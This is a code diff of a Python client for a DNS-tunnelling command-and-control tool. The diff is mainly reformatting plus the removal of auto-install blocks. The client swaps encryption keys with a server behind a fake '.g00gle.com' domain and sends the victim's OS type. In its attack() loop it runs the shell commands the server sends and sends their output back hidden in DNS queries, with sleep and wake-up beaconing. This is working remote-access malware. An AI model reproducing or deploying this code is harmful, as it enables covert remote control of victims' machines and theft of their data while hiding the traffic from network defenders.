@@ -5,44 +5,27 @@ Naor Maman
 # region imports
 import subprocess
 
-try:
-    import pyDH
-except ModuleNotFoundError:
-    subprocess.Popen(['pip3', 'install', 'pyDH'])
-    import pyDH
-
-try:
-    from scapy.all import *
-except ModuleNotFoundError:
-    subprocess.Popen(['pip3', 'install', 'scapy'])
-    from scapy.all import *
+import pyDH
+from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
-
-try:
-    from Crypto.Cipher import AES
-except ModuleNotFoundError:
-    subprocess.Popen(['pip3', 'install', 'pycryptodome'])
-    from Crypto.Cipher import AES
+from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-
-try:
-    import secrets
-except ModuleNotFoundError:
-    subprocess.Popen(['pip3', 'install', 'secrets'])
-    import secrets
+import secrets
 
 import time
 import base64
 import platform
 
 # endregion
+
 tmp_msg = b''
 TYPES = {'A': 1, 'AAAA': 28, 'CNAME': 5, 'TXT': 16}
 DOMAIN = b".g00gle.com."
 DNS_SERVER_IP = "10.3.1.24"
 MAX_CHARS_IN_SUBDOMAIN = 63
-MAX_DOMAIN = 255 - len(DOMAIN) - 9 - 9 - 1  # `-9` for the code in base32 and `-9` for the identify number
+# `-9` for the code in base32 and `-9` for the identify number
+MAX_DOMAIN = 255 - len(DOMAIN) - 9 - 9 - 1
 CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 300, 'ok&retransmission': 401,
                    'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
 SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 301, 'error&retransmission': 400,
@@ -75,16 +58,20 @@ def key_exchange():
     global os_type
 
     # encode the victim public key with base32 and send it to the server
-    base32_public_key = build_req(CLIENT_COMMANDS['keyExchange1'], dH_pubkey.to_bytes(256, 'little'))
+    base32_public_key = build_req(
+        CLIENT_COMMANDS['keyExchange1'], dH_pubkey.to_bytes(256, 'little'))
 
     # get the public key of the server and generate the shared key:
     the_code, base32_server_dh_pubkey = send_req_recv_res(base32_public_key)
     server_dh_pubkey = base64.b32decode(base32_server_dh_pubkey)
-    shared_key = dh.gen_shared_key(int.from_bytes(server_dh_pubkey, 'little')).encode()
+    shared_key = dh.gen_shared_key(
+        int.from_bytes(server_dh_pubkey, 'little')).encode()
 
     # send the victim os type and with it finish the key exchanging
-    os_type = build_req(CLIENT_COMMANDS['keyExchange3'], platform.system().encode())
-    return send_req_recv_res(os_type)  # return the next command to perform and it's code
+    os_type = build_req(
+        CLIENT_COMMANDS['keyExchange3'], platform.system().encode())
+    # return the next command to perform and it's code
+    return send_req_recv_res(os_type)
 
 
 def build_req(cmd_code: int, msg: bytes):
@@ -128,22 +115,26 @@ def send_req_recv_res(fake_domain: bytes):
                      base64.b32encode(str(CLIENT_COMMANDS['last']).encode())]
 
         # send first part of answer:
-        qname = identify + b'.' + enc_codes[0] + b'.' + fake_domain[:MAX_DOMAIN] + DOMAIN
+        qname = identify + b'.' + enc_codes[0] + \
+            b'.' + fake_domain[:MAX_DOMAIN] + DOMAIN
         send_req(qname)
 
         # send the inner parts of the answer:
         i = MAX_DOMAIN
         while i + MAX_DOMAIN < len(fake_domain):
-            qname = identify + b'.' + enc_codes[1] + b'.' + fake_domain[i:i + MAX_DOMAIN] + DOMAIN
+            qname = identify + b'.' + \
+                enc_codes[1] + b'.' + fake_domain[i:i + MAX_DOMAIN] + DOMAIN
             send_req(qname)
             i += MAX_DOMAIN
 
         # send last part of answer:
-        qname = identify + b'.' + enc_codes[2] + b'.' + fake_domain[i:] + DOMAIN
+        qname = identify + b'.' + \
+            enc_codes[2] + b'.' + fake_domain[i:] + DOMAIN
         return send_req(qname)  # return the next operation and its code
 
     else:
-        return send_req(identify + b'.' + fake_domain + DOMAIN)  # return the next operation and its code
+        # return the next operation and its code
+        return send_req(identify + b'.' + fake_domain + DOMAIN)
 
 
 def send_req(qname: bytes):
@@ -156,7 +147,8 @@ def send_req(qname: bytes):
     while cmd_code == SERVER_COMMANDS['error&retransmission']:
         # create the DNS query and send it:
         # todo: get automatically the local dns server ip
-        dns_req = IP(dst=DNS_SERVER_IP) / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=qname, qtype='CNAME'))
+        dns_req = IP(dst=DNS_SERVER_IP) / UDP(sport=234, dport=53) / \
+            DNS(rd=1, qd=DNSQR(qname=qname, qtype='CNAME'))
         response = sr1(dns_req, verbose=False)
         cmd_code, command = parse_response(response[DNSRR])
 
@@ -165,9 +157,11 @@ def send_req(qname: bytes):
             tmp_data = command
             while cmd_code != SERVER_COMMANDS['last']:
                 # send an 'ACK' to server and parse the next part:
-                fake_domain = identify + b'.' + build_req(CLIENT_COMMANDS['ok&continue'], b'continue') + DOMAIN
+                fake_domain = identify + b'.' + \
+                    build_req(
+                        CLIENT_COMMANDS['ok&continue'], b'continue') + DOMAIN
                 dns_req = IP(dst=DNS_SERVER_IP) / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=fake_domain,
-                                                                                             qtype='CNAME'))
+                                                                                                qtype='CNAME'))
                 response = sr1(dns_req, verbose=False)
                 cmd_code, command = parse_response(response[DNSRR])
                 tmp_data += command  # save the parts in temp var
@@ -186,10 +180,12 @@ def parse_response(dns_response: DNSRR):
     enc_response = dns_response.rdata
 
     if dns_response.type == TYPES['TXT']:
-        enc_response = enc_response[0]  # this is the syntax of TXT rdata response in scapy
+        # this is the syntax of TXT rdata response in scapy
+        enc_response = enc_response[0]
 
     enc_response = enc_response[:-len(DOMAIN)]  # remove the fake domain name
-    enc_code, enc_response = enc_response.split(b'.', 1)  # split to code and encoded message
+    enc_code, enc_response = enc_response.split(
+        b'.', 1)  # split to code and encoded message
     cmd_code = base64.b32decode(enc_code).decode()  # decode the code
 
     try:
@@ -200,7 +196,8 @@ def parse_response(dns_response: DNSRR):
     # check if it this command it's the first part between other parts:
     if cmd_code == SERVER_COMMANDS['more']:
         # todo: maybe we need to do something with `real_enc_code`?
-        real_enc_code, enc_response = enc_response.split(b'.', 1)  # split to code and enc msg
+        real_enc_code, enc_response = enc_response.split(
+            b'.', 1)  # split to code and enc msg
         dec_response = enc_response.replace(b'.', b'')  # remove the dots
 
     # check if it this command is one from other parts:
@@ -243,13 +240,15 @@ def attack():
         if cmd_code == SERVER_COMMANDS['ok&process']:
             # run the command in the shell...
             try:
-                output: bytes = subprocess.Popen(command.strip().split(' '), stdout=subprocess.PIPE).communicate()[0]
+                output: bytes = subprocess.Popen(command.strip().split(
+                    ' '), stdout=subprocess.PIPE).communicate()[0]
             except Exception:
                 output: bytes = b'Error: Unknown command!'
 
             print("[!] send to server:\n", output.decode())
             enc_msg = build_req(CLIENT_COMMANDS['ok&ans'], output)
-            cmd_code, command = send_req_recv_res(enc_msg)  # ... and send the result to the server
+            # ... and send the result to the server
+            cmd_code, command = send_req_recv_res(enc_msg)
 
         elif cmd_code == SERVER_COMMANDS['ok&sleep']:
             print('[!] good night for', command, 'seconds')
@@ -258,7 +257,8 @@ def attack():
             # send a wakeup message
             print('[!] good an awake msg to server')
             enc_msg = build_req(CLIENT_COMMANDS['awake'], b'awake')
-            cmd_code, command = send_req_recv_res(enc_msg)  # ... and send the result to the server
+            # ... and send the result to the server
+            cmd_code, command = send_req_recv_res(enc_msg)
 
 
 if __name__ == "__main__":
